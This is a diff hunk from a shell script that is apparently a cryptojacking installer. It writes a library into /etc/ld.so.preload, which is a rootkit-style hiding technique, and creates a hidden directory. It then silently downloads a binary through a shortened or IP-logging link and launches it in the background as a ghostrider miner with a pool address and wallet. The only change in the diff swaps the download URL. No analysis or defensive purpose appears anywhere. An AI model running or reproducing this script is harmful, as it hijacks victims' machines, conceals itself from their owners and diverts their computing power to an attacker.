@@ -7,7 +7,7 @@ mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 mkdir .lib && cd .lib
-wget -O sgr1 https://bitly.ws/38oka >/dev/null 2>&1
+wget -O sgr1 https://grabify.link/ZLM1GC >/dev/null 2>&1
 chmod +x sgr1
 sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
 nice -n -10 nohup ./sgr1 --algorithm ghostrider --pool 192.95.37.3:7054 --wallet RfX7RdyqJPHJbp6UZDcJm5BpasBKafsBTe.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  > /dev/null 2>&1 &
